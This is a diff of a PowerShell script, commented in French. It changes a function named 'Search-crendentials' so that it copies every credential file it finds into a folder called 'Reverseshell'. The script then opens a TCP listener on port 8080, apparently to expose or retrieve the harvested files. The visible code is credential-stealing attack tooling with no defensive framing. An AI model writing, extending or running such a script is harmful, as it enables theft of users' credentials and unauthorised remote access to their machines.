@@ -2,7 +2,9 @@
 #Remove-Item -path "fichier.txt" -force
 
 
-$file = "$env:USERPROFILE\fichier.txt"
+
+$destination = "$env:USERPROFILE\Desktop\Powershell\Reverseshell\"
+
 
 
 Function Search-crendentials { 
@@ -16,15 +18,17 @@ Function Search-crendentials {
 			foreach ($path in $paths){
 				
 				if(Test-Path $path){
+
+                   
+                    			Copy-Item -path $path -destination $destination -force
 					
-					Add-Content -path $file -Value $path
+					
 					
 				}
 			}
 }
 
 Search-crendentials
-
 
 #Création d'un serveur Tcp sur le port 8080
 $listener= [System.Net.Sockets.TcpListener]::new(8080)
